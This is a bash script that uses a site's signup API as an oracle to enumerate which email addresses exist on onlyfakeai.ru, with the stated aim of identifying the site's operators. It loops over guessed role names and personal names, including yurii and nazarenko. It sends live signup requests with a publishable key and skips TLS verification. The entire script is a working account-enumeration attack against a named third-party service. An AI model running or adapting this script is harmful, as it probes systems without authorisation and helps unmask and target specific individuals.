#!/bin/bash
# Round-2 signup oracle: more candidate operator identities on onlyfakeai.ru
set -u
KEY="<publishable-key>"
SUP="https://cdn.onlyfakeai.ru/auth/v1/signup"
UA="Mozilla/5.0"
NAMES=(root dev yurii yuriy yuri nazarenko uriel torford johnwick wick admin1 admin2 administrator owner sales info billing noreply no-reply help team mod support2 ops2)
for n in "${NAMES[@]}"; do
  e="$n@onlyfakeai.ru"
  body=$(curl -sS -k -m 20 -A "$UA" -H "apikey: $KEY" -H 'Content-Type: application/json' \
    -d "{\"email\":\"$e\",\"password\":\"Probe$(date +%s%N | tail -c 7)!\",\"data\":{}}" \
    -w '\n%{http_code}' "$SUP")
  code=$(echo "$body" | tail -1)
  msg=$(echo "$body" | head -n -1 | head -c 120)
  echo "[$code] $e :: $msg"
  sleep 0.7
done
